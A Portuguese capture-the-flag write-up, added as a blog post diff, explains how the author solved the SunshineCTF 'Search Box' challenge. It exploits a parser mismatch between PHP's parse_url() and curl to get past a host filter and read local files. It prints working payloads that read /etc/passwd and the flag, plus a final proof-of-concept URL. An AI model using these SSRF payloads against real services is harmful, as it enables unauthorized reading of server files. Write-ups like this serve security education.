@@ -1,0 +1,181 @@
+---
+title: "SunshineCtf - Search Box Writeup"
+layout: post
+date: 2018-04-08
+categories: writeups
+---
+
+<code>"This search engine doesn't look very secure.
+Or well coded.
+Or competent in any way shape or form.
+This should be easy.
+<br>
+<br>
+Note: flag is in /etc/flag.txt
+<br>
+<br>
+http://search-box.web1.sunshinectf.org"</code>
+<br>
+<br>
+Dentro da página tinhas um pequeno input para enviarmos uma request para um site que seria algum "qualquer".
+<br>
+<img src="https://i.imgur.com/vltSBlC.png">
+<br>
+<img src="https://i.imgur.com/wpr4QMb.png">
+<br>
+<br>
+Porém, com alguns pequenos testes acabei percebendo que ele estava apenas aceitando o <code>host</code> como sendo 'www.google.com'.
+Lógicamente uma das primeiras coisas que me veio na cabeça seria tentar acessar algum arquivo via <code>file://</code>, porem, sem sucesso.
+<br>
+<img src="https://i.imgur.com/ImCQbcQ.png">
+<br>
+<br>
+no momento que eu comecei a pensar que o <code>file://</code> não teria serventia, pensei em fazer o seguinte, juntar o wrapper mais o domínio que havia funcionado:
+<br>
+<img src="https://i.imgur.com/gpuZAAn.png">
+<br>
+<code>"get source failed"</code>, oops, então quer dizer que o wrapper na verdade funciona, o que não está dando certo é a procura pelo www.google.com nos diretorios, ou seja, aqui temos um filtro de host, e para confirmar isso:
+<br>
+<img src="https://i.imgur.com/MnYZ7CY.png">
+<br>
+<br>
+Está sendo usado o <code>parse_url()</code> do php, se fizermos alguns pequenos testes, podemos tirar nossas conclusões:
+<br>
+<br>
+{% highlight bash %}
+php > $url = "file://www.google.com";
+php > var_dump(parse_url($url));
+array(2) {
+  ["scheme"]=>
+  string(4) "file"
+  ["host"]=>
+  string(14) "www.google.com"
+}
+{% endhighlight %}
+<br>
+Levando em consideração que o nosso host precisa ser sempre www.google.com, precisamos achar uma forma de conseguir passar uma chamada para algum arquivo interno, ou primeiro, tentar conseguir acessar o localhost.
+<br>
+<br>
+{% highlight bash %}
+php > $url = "http://127.0.0.1@www.google.com";
+php > var_dump(parse_url($url));
+array(3) {
+  ["scheme"]=>
+  string(4) "http"
+  ["host"]=>
+  string(14) "www.google.com"
+  ["user"]=>
+  string(9) "127.0.0.1"
+}
+{% endhighlight %}
+<br>
+Neste output acima, estamos passando o 127.0.0.1 como user, porem, o curl nao vai encontrar um user de autenticação igual a <code>127.0.0.1</code>, a url será interpretada corretamente:
+<br>
+<img src="https://i.imgur.com/Q3N9nUN.png">
+<br>
+Podemos tirar nossas conclusões que, se ele retornou "Source Code", ou estamos em <code>127.0.0.1</code> e o nosso bypass funcionou, ou estamos em <code>www.google.com</code>.
+Para saber isso, podemos tentar pegar algum arquivo interno, como o index.php que existe no webroot.
+<br>
+<img src="https://i.imgur.com/mPBmx5f.png">
+<br>
+Eee... não funcionou. 
+<br>
+<br>
+Fazendo algumas rápidas pesquisas e alguns testes, identifiquei um outro bypass, onde passamos um <code>user@127.0.0.1</code> como usuário mais uma porta de destino,www.google.com continua sendo o host, porem a interpretação do curl acaba desvalorizando isso. Então, o <code>parse_url()</code> praticamente não tem uma serventia de segurança neste código:
+<br>
+{% highlight bash %}
+php > $url = "http://user@127.0.0.1:80@www.google.com/index.php";
+php > var_dump(parse_url($url));
+array(5) {
+  ["scheme"]=>
+  string(4) "http"
+  ["host"]=>
+  string(14) "www.google.com"
+  ["user"]=>
+  string(14) "user@127.0.0.1"
+  ["pass"]=>
+  string(2) "80"
+  ["path"]=>
+  string(10) "/index.php"
+}
+{% endhighlight %}
+<br>
+Fiz também um teste local, com um código em /var/www/html/x.php
+{% highlight bash %}
+$ curl -v "http://user@127.0.0.1:80@www.google.com/x.php"
+*   Trying 127.0.0.1...
+* Connected to 127.0.0.1 (127.0.0.1) port 80 (#0)
+* Server auth using Basic with user 'user'
+> GET /x.php HTTP/1.1
+> Host: 127.0.0.1
+> Authorization: Basic dXNlcjo=
+> User-Agent: curl/7.47.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Sat, 07 Apr 2018 00:47:05 GMT
+< Server: Apache/2.4.18 (Ubuntu)
+< Content-Length: 11
+< Content-Type: text/html; charset=UTF-8
+< 
+TEST SSRF
+* Connection #0 to host 127.0.0.1 left intact
+{% endhighlight %}
+<br>
+<br>
+então fui para a aplicação:
+<br>
+<img src="https://i.imgur.com/PZmUHgj.png">
+<br>
+<img src="https://i.imgur.com/nYUEobv.png">
+<br>
+Porém a challenge nos dizia que era necessário pegar a flag em <code>/etc/flag.txt</code>, mas não havia como eu usar o <code>file://</code> pois nenhum arquivo estava sendo lido, me pareceu estranho isso.
+<br>
+<img src="https://i.imgur.com/xJWLbbN.png">
+<br>
+<br>
+notei que ao final de cada arquivo passado, estava sendo concatenada à request uma <code>/</code>, resolvi testar isso direto pelo curl e comparar os resultados:
+{% highlight bash %}
+$ curl -v "file://user@127.0.0.1:80@www.google.com/etc/passwd"
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+{% endhighlight %}
+
+<br>
+VS:
+<br>
+{% highlight bash %}
+$ curl -v "file://user@127.0.0.1:80@www.google.com/etc/passwd/"
+* Couldn't open file /etc/passwd/
+* Closing connection -1
+curl: (37) Couldn't open file /etc/passwd/
+{% endhighlight %}
+<br>
+<br>
+Pensei em colocar uma "#" para travar isso, o curl aceitou:
+{% highlight bash %}
+$ curl -v "file://user@127.0.0.1:80@www.google.com/etc/passwd#/"
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+{% endhighlight %}
+<br>
+Mas a aplicação(usando o burp), não aceitou:
+<br>
+<img src="https://i.imgur.com/sn6lkYR.png">
+<br>
+Então fiz o simples, o encode de <code>#</code> para ser igual a <code>%23</code>, e funcionou!
+<br>
+<img src="https://i.imgur.com/W6BsOji.png">
+<br>
+<img src="https://i.imgur.com/BvHy36g.png">
+<br>
+<code>Flag: sun{R3quE5t_tyP3S_m4tT3r}</code>
+<br>
+
+<code>final PoC: file://user@evil.com:80@www.google.com//var/www/html/index.php%23</code>
+
+
+
